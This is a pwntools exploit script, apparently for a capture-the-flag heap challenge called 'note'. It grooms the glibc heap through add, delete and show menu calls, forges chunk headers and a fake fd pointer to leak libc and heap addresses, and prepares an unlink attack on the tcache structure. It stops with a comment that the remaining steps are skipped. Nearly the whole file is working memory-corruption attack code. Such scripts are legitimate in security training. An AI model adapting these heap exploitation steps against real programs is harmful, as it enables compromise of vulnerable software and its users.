from pwn import *

r = process('./note')

context.arch = 'amd64'

def add(size, content):
    r.sendlineafter(':', '1')
    r.sendlineafter(':', str(size))
    r.sendafter(':', content)

def show(idx):
    r.sendlineafter(':', '3')
    r.sendlineafter(': ', str(idx))

def delete(idx):
    r.sendlineafter(':', '2')
    r.sendlineafter(':', str(idx))


add(0x400+0x9e0, 'A')


# remove smallbin
for i in range(10):
    add(0x30, 'A')
add(0x50, 'A')
for i in range(11):
    add(0x60, 'A')

add(0x150, 'A')
add(0x170, 'A')


# 25 
add(0x3f0, 'A')
add(0x3f0, 'A')

add(0x400, 'A')
add(0x400-0x30, 'A')
add(0x90, 'A')
add(0x420, 'A')
add(0x400, 'A')
add(0x420, 'A')


#33

for i in range(10): 
    add(0x90, 'A')
for i in range(7):
    add(0x3f0, 'A')
for i in range(7):
    add(0x400, 'A')


for i in range(36,43):
    delete(i)
for i in range(43,50):
    delete(i)
for i in range(50,57):
    delete(i)


delete(25)
add(0x500, 'A')

delete(30)
add(0x500, 'A')

delete(27)
add(0x500, 'A')


for i in range(7): #36, 43
    add(0x3f0, 'A')


add(0x3f0, 'A'*8 + '\x11\x9f'.ljust(7, '\x00')) # 43

for i in range(7):  # 44, 51
    add(0x400, 'A')

add(0x400, 'A') # 51


delete(44)
delete(51)
add(0x400, '\x20')

add(0x420, "A") # 51


delete(32)
delete(51)
add(0x500, 'A') # 32
add(0x420, 'A'*8 + '\x20') # 51


add(0x420, 'A') # 52


for i in range(53, 60):
    add(0x3f0, 'A')

add(0x500, 'A') # 60
add(0x500, 'A')
add(0x500, 'A')

add(0x3f0, 'A') # 63
add(0x3f0, 'A')
add(0x3f0, 'A')


delete(63)
add(0x3f8, 'A'*0x3f0 + p64(0x9f10))

for i in range(53, 60):
    delete(i)

delete(64)

add(0x3e0, 'BB') # 53
show(26)
libc = u64(r.recvn(6).ljust(8, '\x00'))-0x1e4ca0
print('libc', hex(libc))


#54
for i in range(54, 61):
    add(0xe0, 'A')

# 64
add(0xe0, 'A')
delete(54)
delete(64)
show(26)
heap = u64(r.recvn(6).ljust(8, '\x00')) - 0x2030
print('heap', hex(heap))

add(0x10, 'A') #54
add(0x9d30, 'A'*0xa00 + flat(0, 0x21, 0,0,0, 0x31)) #64
delete(29)
delete(64)
add(0x9d30, 'A'*0xa00 + flat(0, 0x21, 0,0,0, heap+0x40)) #29 # fake fd
add(0x400, 'A') # 64


for i in range(65, 72):
    add(0x3f0, 'A')

# 74
add(0x3a0, 'A')
add(0x3b0, 'A')

delete(75)
delete(74)

# 74
add(0x2000, 'A')
add(0x280, 'A')
add(0x2f0, 'A')
add(0x280, 'A')



add(0x28, 'A'*0x10 + flat(heap+0x40) )

for i in range(7):
    add(0x2f0, 'A')
for i in range(79, 86):
    delete(i)


delete(78)
delete(75)
add(0x288, 'A'*0x280 + p64(0x10100))
delete(76)


# Now, we can allocate from tcache_pthread_struct
# using largebin fd bk to make 1/16 unlink attack
# skipping remaining works

r.interactive()
